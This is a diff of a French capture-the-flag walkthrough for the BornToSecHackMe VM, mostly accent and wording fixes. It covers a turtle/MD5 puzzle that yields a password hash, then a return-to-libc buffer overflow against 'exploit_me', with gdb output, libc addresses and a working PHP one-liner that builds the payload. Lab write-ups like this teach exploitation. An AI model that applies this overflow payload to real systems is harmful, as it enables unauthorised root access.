@@ -500,17 +500,16 @@ Nous avons un fichier README et un fichier turtle dans le home du user.
 thor@BornToSecHackMe:~$ cat README
 Finish this challenge and use the result as password for 'zaz' user.
 
-Pour le fichier turtle une suite d'instructions de deplacement, puis a la fin du fichier :"Can you digest the message";
-Turtle, le nom d'une librairie graphique en python, il va donc falloir parser le fichier et en faire un script comprehensible par cette lib.
+Pour le fichier turtle une suite d'instructions de déplacement, puis à la fin du fichier : "Can you digest the message";
+Turtle, le nom d'une librairie graphique en python, il va donc falloir parser le fichier et en faire un script compréhensible par cette lib.
 
-Le script est lance avec le binaire et nous obtenons un dessin representant les lettres SLASH
-MD5 : Message Digest 5, en rapport avec la piste donnee a la fin du fichier turtle.
+Le script est lancé avec le binaire et nous obtenons un dessin représentant les lettres SLASH
+MD5 : Message Digest 5, en rapport avec la piste donnée à la fin du fichier turtle.
 
 Ce qui nous donne : 646da671ca01bb5d84dbb5fb2238dc8e
 
 
-
-_______________________________________________________________________________
+______________________________________________________________________________
 
 								SSH TO ROOT
 _______________________________________________________________________________
@@ -519,14 +518,14 @@ Nous lancons gdb.. blabla
 
 
 Pour cette exercice, il va falloir utiliser le buffer overflow, une technique qui via
-la fonction strcpy va nous permet d'ecrire un nombre de charactere superieur a ce qui est alloue a cette ligne
+la fonction strcpy va nous permettre d'écrire un nombre de chars supérieurs à ce qui est alloué a cette ligne
 
 	0x080483fa <+6>: sub    $0x90,%esp
 
-qui va nous permettre d'ecraser le contenu de l'adresse retour et d'y placer un call system pour lancer un shell.
+qui va nous permettre d'écraser le contenu de l'adresse retour et d'y placer un call system pour lancer un shell.
 L'exploitation de cette faille porte le nom de Returntolibc.
 
-Dans un premier temps nous allons recuperer l'adresse d'EIP juste avant le return :
+Dans un premier temps nous allons récuperer l'adresse d'EIP juste avant le return (nous vous epargnons les breaks etc.. celui-ci est placé juste avant le leave) :
 
 	(gdb) info frame
 	Stack level 0, frame at 0xbffff6e0:
@@ -536,7 +535,7 @@ Dans un premier temps nous allons recuperer l'adresse d'EIP juste avant le retur
 	 Saved registers:
 	ebp at 0xbffff6d8, eip at 0xbffff6dc
 
-EIP est donc a : 0xbffff6dc
+EIP est donc situé à l'adresse : 0xbffff6dc
 
 Ensuite nous allons calculer la taille exact de notre buffer:
 
@@ -553,13 +552,13 @@ Ensuite nous allons calculer la taille exact de notre buffer:
 	(gdb) p/d 0xbffff6dc - 0xbffff650
 	$2 = 140
 
-Nous avons prealablement envoye une chaine de 46 'A', nous affichons ensuite les 30 elements sur le haut de la pile.
-Nous reconnaissons ici  0x41414141 qui correspond a notre char 'A' a l'adresse 0xbffff650 qui est donc l'adresse du debut de notre buffer.
-Nous comptons d'ailleurs 46 octets a partir de cette adresse, en accord avec le nombre de 'A' entre.
-On soustrais ensuite l'adresse de notre EIP a celle du debut de notre buffer pour avoir la taille de celui-ci.
-Nous obtenons donc 140, au dela nous ecrirons donc sur EIP, l'instruction RET qui est un POP suivi d'un jmp, fera notre appel system.
+Nous avons préalablement envoyé une chaine de 46 'A', nous affichons ensuite les 30 elements sur le haut de la pile.
+Nous reconnaissons ici  0x41414141 qui correspond à notre char 'A' à l'adresse 0xbffff650 qui est donc l'adresse du début de notre buffer.
+Nous comptons d'ailleurs 46 octets à partir de cette adresse, en accord avec le nombre de 'A' entré.
+Nous soustrayons ensuite l'adresse de notre EIP à celle du debut de notre buffer pour avoir la taille de celui-ci.
+Nous obtenons donc 140, au dela nous écrirons donc sur EIP, l'instruction RET qui est un POP suivi d'un jmp, fera notre appel system.
 
-Nous allons maintenant recuperer les adresses de la fonction system, exit, puis celle de "/bin/sh"
+Nous allons maintenant récuperer les adresses des fonctions de la libc : system, exit, puis l'adresse de "/bin/sh"
 
 (gdb) p exit
 $5 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
@@ -572,7 +571,7 @@ $4 = {<text variable, no debug info>} 0xb7e6b060 <system>
 warning: Unable to access target memory at 0xb7fd3160, halting search.
 1 pattern found.
 
-Nous avons desormais les 3 adresses, il ne nous reste plus qu'a execute notre petit script qui va creer un fichier avec notre code, puis lancer l'executable avec celui-ci
+Nous avons désormais les 3 adresses, il ne nous reste plus qu'a éxecuter notre petit script qui va créer un fichier avec notre code, puis lancer l'éxecutable avec celui-ci
 
 zaz@BornToSecHackMe:~$ echo '<?php echo str_repeat('A', 140)."\x60\xb0\xe6\xb7"."\xe0\xeb\xe5\xb7"."\x58\xcc\xf8\xb7";' > script.php;./exploit_me $(php script.php)
 PHP Notice:  Use of undefined constant A - assumed 'A' in /home/zaz/script.php on line 1
